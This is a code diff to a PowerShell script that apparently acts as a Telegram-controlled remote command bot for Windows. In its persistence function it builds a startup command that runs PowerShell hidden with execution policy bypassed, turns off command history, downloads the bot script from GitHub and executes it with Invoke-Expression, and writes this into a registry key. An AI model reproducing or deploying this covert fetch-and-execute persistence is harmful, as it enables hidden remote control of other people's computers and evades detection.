@@ -8,8 +8,17 @@ Set-Location            -Path               $env:USERPROFILE
 Add-Type                -AssemblyName       System.Windows.Forms
 Add-type                -AssemblyName       System.Drawing
 
-$telegram_TOKEN             = "#TOKEN#"  # your API Token
-$telegram_ID                = "#ID#"     # your Telegram ID
+
+$telegram_TOKEN = "#TOKEN#"  # your API Token
+$telegram_ID    = "#ID#"     # your Telegram ID
+
+if (($telegram_TOKEN -match "#TOKEN#") -and ($telegram_ID -match "#ID#")) 
+{
+    Write-Host "...persistence mode..." # TESTING IT...
+    $telegram_TOKEN = "@TOKEN@"
+    $telegram_ID    = "@ID@"
+}
+
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'               -f $telegram_TOKEN
 $api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'              -f $telegram_TOKEN
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='         -f $telegram_TOKEN
@@ -111,7 +120,7 @@ function persistenceMode ($mode)
     if ($mode -like "on") 
     {
         $powershell_executable_path = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-        $powershell_executable_cmd  = ('-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-PSReadlineOption -HistorySaveStyle SaveNothing; while(-Not(tnc).PingSucceeded) { Start-Sleep -Seconds 1 }; Invoke-Expression -Command ((((iwr -uri "https://raw.githubusercontent.com/FebVeg/TelegramCommandReceiver/master/bot.ps1").Content).ToString().Replace("#TOKEN#", ') + $telegram_TOKEN + (')).Replace("#ID#", ') + $telegram_ID + (')))')
+        $powershell_executable_cmd  = ('-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-PSReadlineOption -HistorySaveStyle SaveNothing; while(-Not(tnc).PingSucceeded) { Start-Sleep -Seconds 1 }; Invoke-Expression -Command ((((iwr -uri "https://raw.githubusercontent.com/FebVeg/TelegramCommandReceiver/master/bot.ps1").Content).ToString().Replace("@TOKEN@", ') + $telegram_TOKEN + (')).Replace("@ID@", ') + $telegram_ID + (')))')
         $powershell_startup_script  = ($powershell_executable_path + " " + $powershell_executable_cmd)
         try {
             sendMessage "Writing the register key..."
